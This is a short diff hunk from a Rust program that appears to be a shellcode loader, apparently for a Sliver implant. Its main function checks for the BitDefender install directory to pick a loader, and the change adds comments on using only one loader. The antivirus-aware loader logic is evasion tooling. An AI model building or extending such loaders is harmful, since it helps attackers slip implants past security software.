@@ -89,6 +89,8 @@ fn decrypt_shellcode_stub_sliv() -> Vec<u8> {
 
 fn main() {
     // Change this to the path of the directory you want to check
+    //Comment the next line and the if function and uncomment the last two lines of code
+    //to use only one loader
     let dir_path = PathBuf::from("C:\\Program Files\\BitDefender");
   
     if Path::new(&dir_path).exists() && dir_path.is_dir() {
